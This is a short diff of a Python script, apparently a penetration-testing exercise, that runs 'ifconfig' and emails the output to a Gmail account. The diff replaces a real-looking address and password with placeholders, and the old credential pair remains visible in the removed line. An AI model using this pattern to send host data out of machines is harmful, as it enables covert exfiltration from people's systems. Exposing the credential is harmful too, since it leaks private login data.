@@ -13,4 +13,4 @@ def send_mail(email,password,message):
 
 command = "ifconfig"
 result = subprocess.check_output(command,shell=True)
-send_mail("pentesterpd@gmail.com","Asdfjkl;1",result)
+send_mail("mail@gmail.com","password",result)
